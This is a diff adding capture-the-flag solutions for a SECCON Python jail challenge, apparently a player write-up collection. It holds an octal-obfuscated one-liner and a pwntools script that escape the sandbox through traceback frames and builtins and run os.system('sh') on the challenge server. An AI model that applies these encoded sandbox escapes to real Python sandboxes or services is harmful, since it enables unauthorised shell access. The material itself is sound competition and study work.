@@ -469,3 +469,26 @@ io.close()
 jail> muhammed
 jail> [ [ [[o:=ex] if i == "0" else 0] and [[s:="__traceback__"] if i == "0" else 0] and [[s:="tb_frame"] if i == "1" else 0] and [[s:="f_builtins"] if i == "2" else 0] and [[s:="\50\51\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\56\137\137\163\165\142\143\154\141\163\163\145\163\137\137\50\133\135\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\51\133\60\135\56\162\145\147\151\163\164\145\162\56\137\137\142\165\151\154\164\151\156\163\137\137\133\42\137\137\151\155\160\157\162\164\137\137\42\135\50\42\157\163\42\51\56\163\171\163\164\145\155\50\42\163\150\42\51"] if i == "3" else 0] and [[tt:=o.__getattribute__] if i == "0" or i == "1" or i == "2" else 0] and [[tt:=o['eval']] if i == "3" else 0] and [[o:=tt(s)] if True else 0] ] for i in "0123" ]
 ```
+
+@xtea418:
+
+```python
+from pwn import remote
+
+def encode(s: str):
+    fin = ""
+    for c in s:
+        fin += r"\x" + hex(ord(c))[2:]
+    return fin
+
+
+payload = ["1/0"]
+payload.append(f"'{encode('{0.__traceback__.tb_frame.f_builtins[exec].a}')}'.format(ex)")
+payload.append(
+    f"ex.obj('{encode("[].__class__.__base__.__subclasses__()[-2].__init__.__builtins__['__import__']('os').system('sh')")}')"
+)
+rem = remote("excepython.seccon.games", 5000)
+for line in payload:
+    rem.sendlineafter(b"jail>", line)
+rem.interactive()
+```
